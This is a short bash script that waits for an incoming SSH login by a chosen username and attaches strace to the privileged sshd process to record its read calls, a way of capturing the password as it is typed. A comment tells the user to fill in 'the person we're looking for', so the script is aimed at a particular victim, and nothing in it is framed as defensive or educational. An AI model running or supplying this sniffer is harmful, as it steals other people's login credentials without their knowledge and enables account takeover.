#!/bin/bash
# Tries to sniff incoming SSH connections

while [ 1 ]
do
        # Get the PID of the child process
        # NOTE: Need to replace the username with the person we're looking for!
        USERNAME="testing"
        PID=$(pgrep -f "sshd: $USERNAME \[priv\]")

        if [ -z "$PID" ]
        then
                echo -en "\rWaiting for ssh connection..."
        else
                # Run strace
                echo -e "\n"
                strace -p $PID -e read

                # Sleep a bit
                sleep 1
        fi
done
